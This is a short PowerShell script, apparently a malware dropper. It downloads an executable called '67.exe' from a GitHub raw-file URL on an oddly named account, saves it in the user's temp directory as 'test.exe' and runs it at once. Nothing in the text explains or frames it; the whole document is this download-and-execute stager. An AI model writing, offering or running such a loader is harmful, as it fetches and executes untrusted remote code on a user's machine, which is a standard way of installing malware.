$url = 'https://github.com/naefff24686/..../raw/refs/heads/main/67.exe'
$tempFile = Join-Path $env:TEMP 'test.exe'
Invoke-WebRequest -Uri $url -OutFile $tempFile
Start-Process -FilePath $tempFile -Wait
